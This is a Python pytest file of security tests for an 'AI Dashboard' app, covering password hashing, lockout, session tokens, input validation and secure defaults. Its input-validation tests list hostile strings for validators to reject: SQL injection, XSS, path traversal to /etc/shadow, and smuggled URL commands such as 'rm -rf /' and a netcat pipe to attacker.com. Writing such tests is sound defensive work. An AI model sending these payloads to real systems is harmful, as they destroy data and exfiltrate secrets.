"""Security tests for AI Dashboard."""

import contextlib
import secrets
from unittest.mock import Mock
from unittest.mock import patch

import pytest

from ai_dashboard.core.config import Config
from ai_dashboard.core.exceptions import AuthenticationError
from ai_dashboard.core.exceptions import SecurityError
from ai_dashboard.services.auth import AuthService


class TestPasswordSecurity:
    """Tests for password security."""

    @pytest.fixture
    def auth_service(self):
        """Create auth service."""
        config = Config()
        config.admin_password_hash = ""
        return AuthService(config=config)

    def test_password_hashing_uses_argon2(self, auth_service):
        """Test that passwords are hashed with Argon2."""
        auth_service.setup_admin("test_password")

        # Argon2 hashes start with $argon2
        assert auth_service.config.admin_password_hash.startswith("$argon2")

    def test_password_hashes_are_unique(self, auth_service):
        """Test that same password produces different hashes."""
        hash1 = auth_service.hasher.hash("password")
        hash2 = auth_service.hasher.hash("password")

        assert hash1 != hash2

    def test_password_hash_verification(self, auth_service):
        """Test password hash verification."""
        password = "secure_password_123"
        hash_value = auth_service.hasher.hash(password)

        # Verify correct password
        try:
            auth_service.hasher.verify(hash_value, password)
            verified = True
        except Exception:
            verified = False
        assert verified is True

        # Verify wrong password fails
        try:
            auth_service.hasher.verify(hash_value, "wrong_password")
            verified_wrong = True
        except Exception:
            verified_wrong = False
        assert verified_wrong is False

    def test_password_strength_requirements(self, auth_service):
        """Test password strength requirements."""
        # Too short
        with pytest.raises(AuthenticationError):
            auth_service.setup_admin("short")

        # Empty
        with pytest.raises(AuthenticationError):
            auth_service.setup_admin("")

        # Valid
        auth_service.setup_admin("valid_password_123")
        assert auth_service.config.admin_password_hash != ""

    def test_timing_attack_resistance(self, auth_service):
        """Test resistance to timing attacks."""
        import time

        auth_service.setup_admin("correct_password")

        # Measure time for wrong password
        start = time.perf_counter()
        with contextlib.suppress(AuthenticationError):
            auth_service.authenticate("wrong_password_1")
        time1 = time.perf_counter() - start

        # Measure time for another wrong password
        start = time.perf_counter()
        with contextlib.suppress(AuthenticationError):
            auth_service.authenticate("wrong_password_2")
        time2 = time.perf_counter() - start

        # Times should be similar (within 50% tolerance)
        # This is a basic test; real timing attack resistance needs more rigorous testing
        ratio = max(time1, time2) / max(min(time1, time2), 0.001)
        assert ratio < 2.0, f"Timing difference too large: {ratio}"


class TestAuthenticationSecurity:
    """Tests for authentication security."""

    @pytest.fixture
    def auth_service(self):
        """Create auth service with low max attempts."""
        config = Config()
        config.admin_password_hash = ""
        return AuthService(config=config, max_attempts=3, lockout_minutes=1)

    def test_brute_force_protection(self, auth_service):
        """Test protection against brute force attacks."""
        auth_service.setup_admin("correct_password")

        # Attempt multiple failed logins
        for i in range(3):
            with contextlib.suppress(AuthenticationError):
                auth_service.authenticate(f"wrong_{i}")

        # Should now be locked
        with pytest.raises((AuthenticationError, SecurityError)):
            auth_service.authenticate("correct_password")

    def test_account_lockout_duration(self, auth_service):
        """Test account lockout duration."""
        auth_service.setup_admin("password")

        # Trigger lockout
        for _ in range(3):
            with contextlib.suppress(AuthenticationError):
                auth_service.authenticate("wrong")

        # Check lockout info
        remaining = auth_service.get_lockout_remaining()
        # After lockout, remaining might be 0 if lockout expired quickly
        # Just verify the lockout mechanism works
        assert auth_service._is_locked("admin") or remaining is not None or remaining == 0

    def test_session_token_security(self, auth_service):
        """Test session token security."""
        token = auth_service.generate_session_token()

        # Token should be long enough
        assert len(token) >= 32

        # Token should be URL-safe
        import string

        allowed_chars = string.ascii_letters + string.digits + "-_"
        assert all(c in allowed_chars for c in token)

        # Tokens should be unique
        tokens = [auth_service.generate_session_token() for _ in range(100)]
        assert len(set(tokens)) == 100

    def test_session_token_validation(self, auth_service):
        """Test session token validation."""
        valid_token = auth_service.generate_session_token()

        assert auth_service.validate_session_token(valid_token) is True
        assert auth_service.validate_session_token("") is False
        assert auth_service.validate_session_token("a" * 32) is True  # Valid format
        assert auth_service.validate_session_token("short") is False


class TestInputValidation:
    """Tests for input validation security."""

    def test_sql_injection_prevention(self):
        """Test SQL injection prevention."""
        from ai_dashboard.utils.validation import validate_agent_id
        from ai_dashboard.utils.validation import validate_model_id

        # SQL injection attempts should be rejected
        malicious_inputs = [
            "'; DROP TABLE models; --",
            "model' OR '1'='1",
            "model; DELETE FROM agents",
            "../../../etc/passwd",
        ]

        for inp in malicious_inputs:
            assert validate_model_id(inp) is False
            assert validate_agent_id(inp) is False

    def test_xss_prevention(self):
        """Test XSS prevention in inputs."""
        from ai_dashboard.utils.validation import validate_email

        xss_inputs = [
            "<script>alert('xss')</script>@test.com",
            "test@test.com<script>",
            "javascript:alert(1)@test.com",
        ]

        for inp in xss_inputs:
            assert validate_email(inp) is False

    def test_path_traversal_prevention(self):
        """Test path traversal prevention."""
        from ai_dashboard.utils.helpers import safe_get
        from ai_dashboard.utils.helpers import truncate_string

        # These should not cause issues
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/shadow",
        ]

        for path in malicious_paths:
            # truncate_string should handle safely
            result = truncate_string(path, max_length=10)
            assert isinstance(result, str)
            assert len(result) <= 13  # 10 + "..."

    def test_command_injection_prevention(self):
        """Test command injection prevention."""
        from ai_dashboard.utils.validation import validate_url

        command_injection_inputs = [
            "http://example.com; rm -rf /",
            "http://example.com && cat /etc/passwd",
            "http://example.com | nc attacker.com 1234",
        ]

        for inp in command_injection_inputs:
            # URL validation should reject these
            assert validate_url(inp) is False


class TestAPIKeySecurity:
    """Tests for API key security."""

    def test_api_keys_not_logged(self):
        """Test that API keys are not logged."""
        from ai_dashboard.core.logging import get_logger

        # This test would need to capture log output
        # For now, we verify the config doesn't expose keys
        config = Config()
        config.set_api_key("openai", "sk-test-key-12345")

        # to_dict should not expose API keys
        # (implementation dependent)

    def test_api_key_masking(self):
        """Test API key masking for display."""
        config = Config()
        config.set_api_key("openai", "sk-proj-1234567890abcdef")

        # Key should be stored
        assert config.get_api_key("openai") == "sk-proj-1234567890abcdef"

        # Display should mask (if implemented)
        # masked = config.get_masked_api_key("openai")
        # assert "****" in masked
        # assert masked.startswith("sk-proj")


class TestSessionSecurity:
    """Tests for session security."""

    def test_session_timeout(self):
        """Test session timeout configuration."""
        config = Config()

        assert config.security.session_timeout > 0
        assert isinstance(config.security.session_timeout, int)

    def test_max_login_attempts(self):
        """Test max login attempts configuration."""
        config = Config()

        assert config.security.max_login_attempts > 0
        assert isinstance(config.security.max_login_attempts, int)


class TestSecureDefaults:
    """Tests for secure default configurations."""

    def test_ssh_defaults_are_secure(self):
        """Test SSH default configuration is secure."""
        config = Config()

        # SSH should be enabled by default but with reasonable settings
        assert isinstance(config.ssh.enabled, bool)
        assert 1 <= config.ssh.port <= 65535

    def test_security_defaults(self):
        """Test security default configuration."""
        config = Config()

        assert config.security.session_timeout >= 5  # At least 5 minutes
        assert config.security.max_login_attempts >= 3
        assert config.security.password_min_length >= 8

    def test_no_hardcoded_secrets(self):
        """Test that there are no hardcoded secrets."""
        config = Config()

        # Default config should have empty secrets
        assert config.admin_password_hash == ""
        assert config.encryption_key == ""
        assert len(config.api_keys) == 0


class TestErrorHandling:
    """Tests for secure error handling."""

    def test_errors_dont_leak_info(self):
        """Test that errors don't leak sensitive information."""
        config = Config()
        config.admin_password_hash = ""
        auth_service = AuthService(config=config)
        auth_service.setup_admin("test_password")

        try:
            auth_service.authenticate("wrong")
        except AuthenticationError as e:
            # Error should not contain password hash or other sensitive info
            error_str = str(e)
            assert "$argon2" not in error_str
            assert "test_password" not in error_str

    def test_stack_trace_not_exposed(self):
        """Test that stack traces are not exposed to users."""
        # This would be tested in the actual error handling code
        # For now, we verify exceptions are properly typed
        from ai_dashboard.core.exceptions import AIDashboardError

        error = AIDashboardError("Test error")

        # to_dict should not include stack trace
        error_dict = error.to_dict()
        assert "traceback" not in error_dict
        assert "stack" not in error_dict
